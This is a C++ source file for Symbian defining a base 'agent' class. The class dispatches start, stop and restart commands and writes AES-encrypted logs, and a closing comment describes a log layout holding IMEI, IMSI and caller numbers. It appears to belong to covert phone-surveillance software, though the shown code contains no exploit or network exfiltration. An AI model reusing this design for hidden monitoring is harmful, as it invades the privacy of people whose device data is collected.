/*
 ============================================================================
 Name		: AbstractAgent.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAbstractAgent implementation
 ============================================================================
 */
#include "AbstractAgent.h"
#include <bautils.h>
#include <HT\FileUtils.h>

#include <HT\AES.h>
#include <HT\AbstractQueueEndPoint.h>
#include <HT\LogFile.h>          // for KAES_LOGS_KEY



EXPORT_C CAbstractAgent::CAbstractAgent(TAgentType aType) :
	CAbstractQueueEndPoint(aType)
	{
	// No implementation required
	}

EXPORT_C CAbstractAgent::~CAbstractAgent()
	{
	__FLOG(_L("Destructor"));
	delete iLogFile;
	iFs.Close();
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

EXPORT_C void CAbstractAgent::BaseConstructL(const TDesC8& params)
	{
	CAbstractQueueEndPoint::BaseConstructL(params);
	User::LeaveIfError(iFs.Connect());

	__FLOG_OPEN_ID("HT", "AbstractAgent.txt");
	__FLOG(_L("-------------"));
	}

void CAbstractAgent::DispatchCommandL(TCmdStruct aCommand)
	{
	switch (aCommand.iType)
		{
		case EStart:
			__FLOG(_L("StartAgentCmtL"));
			StartAgentCmdL();
			break;
		case ERestart:
			StopAgentCmdL();
			StartAgentCmdL();
			break;
		case ECmdStop:
			__FLOG(_L("StopAgentCmtL"));
			StopAgentCmdL();
			// Agents will not receive any more commands after the "STOP"
			SetReceiveCmd(EFalse);  
			break;
		case ENotify:
			break;
		default:
			break;
		}
	MarkCommandAsDispatchedL();
	}

EXPORT_C void CAbstractAgent::CreateLogL(TInt aLogId)
	{
	delete iLogFile;
	iLogFile = NULL;
	iLogFile = CLogFile::NewL(iFs);
	iLogFile->CreateLogL(aLogId);
	}

EXPORT_C void CAbstractAgent::CreateLogL(TInt aLogId,TAny* aAdditionalData)
	{
	delete iLogFile;
	iLogFile = NULL;
	iLogFile = CLogFile::NewL(iFs);
	iLogFile->CreateLogL(aLogId,aAdditionalData);
	}

EXPORT_C void CAbstractAgent::AppendLogL(const TDesC8& data)
	{
	if (iLogFile)
		iLogFile->AppendLogL(data);
	}

EXPORT_C void CAbstractAgent::CloseLogL()
	{
	if (iLogFile)
		iLogFile->CloseLogL();
	delete iLogFile;
	iLogFile = NULL;
	}

/*
 
 #define LOG_VERSION_01 (UINT)2008121901  0x77B1822D
 
 
 UInt32 Lunghezza di LogStruct e di tutti i dati tranne i Data Chunks, paddata al multiplo di AES_BLOCK_SIZE (16)

 [START DATI CIFRATI CON AES]
 typedef struct _LogStruct 
 {
 UINT uVersion;			// Versione della struttura
 UINT uLogType;			// Tipo di log
 UINT uHTimestamp;		// Parte alta del timestamp
 UINT uLTimestamp;		// Parte bassa del timestamp
 UINT uDeviceIdLen;		// IMEI/Hostname len
 UINT uUserIdLen;		// IMSI/Username len
 UINT uSourceIdLen;		// Numero del caller/IP len ????????????????
 UINT uAdditionalData;		// Lunghezza della struttura addizionale, se presente (imposto sempre a zero)
 } LogStruct, *pLogStruct;

 DeviceID
 UserID
 SourceID
 AdditionalData
 
 ...padding...
 [END DATI CIFRATI CON AES]


 Tanti Data Chunk composti come:
 UInt32 lunghezza reale del blocco dati
 [DATI CIFRATI CON AES] 
 
 */
